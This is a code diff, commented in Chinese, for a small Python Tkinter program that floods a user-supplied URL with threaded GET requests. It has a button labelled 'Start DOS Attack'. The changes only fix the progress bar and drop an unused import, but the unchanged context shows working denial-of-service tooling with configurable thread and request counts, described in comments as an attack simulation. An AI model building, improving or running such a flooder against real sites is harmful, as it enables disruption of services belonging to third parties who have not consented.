@@ -1,9 +1,9 @@
 import requests
-from tqdm import tqdm
 import threading
 import time
 import tkinter as tk
 from tkinter import ttk
+
 
 # 定义 dos 函数，用于发送单个请求并更新进度
 def dos(url, progress_var, total_requests):
@@ -11,9 +11,10 @@ def dos(url, progress_var, total_requests):
         requests.get(url)  # 发送 GET 请求
     except requests.exceptions.RequestException:  # 捕获请求异常
         pass
-    progress_var.set(progress_var.get() + 100 / total_requests)  # 更新进度变量
-    if progress_var.get() < total_requests:  # 如果进度未完成，则更新进度条
-        progress_bar['value'] = (progress_var.get() / total_requests) * total_requests
+    progress_var.set(progress_var.get() + 100.0 / total_requests)  # 更新进度变量
+    if progress_var.get() < 100.0:  # 如果进度未完成，则更新进度条
+        progress_bar['value'] = progress_var.get()
+
 
 # 定义 doss 函数，用于创建多个线程来模拟 DOS 攻击
 def doss(url, frequency, times, progress_var):
@@ -26,6 +27,7 @@ def doss(url, frequency, times, progress_var):
     for thread in threads:  # 等待所有线程完成
         thread.join()
 
+
 # 定义 start_dos 函数，用于启动 DOS 攻击模拟
 def start_dos():
     url = url_entry.get()  # 获取 URL 输入
@@ -33,9 +35,10 @@ def start_dos():
     times = int(times_entry.get())  # 获取请求次数输入
     if 'http://' not in url and 'https://' not in url:  # 如果 URL 没有协议头，则添加 https
         url = 'https://' + url
-    progress_var.set(0)  # 重置进度变量
-    progress_bar['value'] = 0  # 重置进度条
+    progress_var.set(0.0)  # 重置进度变量
+    progress_bar['value'] = 0.0  # 重置进度条
     threading.Thread(target=doss, args=(url, frequency, times, progress_var)).start()  # 启动攻击线程
+
 
 # 创建主窗口
 root = tk.Tk()
@@ -65,7 +68,7 @@ start_button = tk.Button(root, text="Start DOS Attack", command=start_dos)
 start_button.pack(pady=20)
 
 # 创建进度条及其变量
-progress_var = tk.IntVar()
+progress_var = tk.DoubleVar()
 progress_bar = ttk.Progressbar(root, length=300, mode='determinate', variable=progress_var)
 progress_bar.pack(pady=10)
 
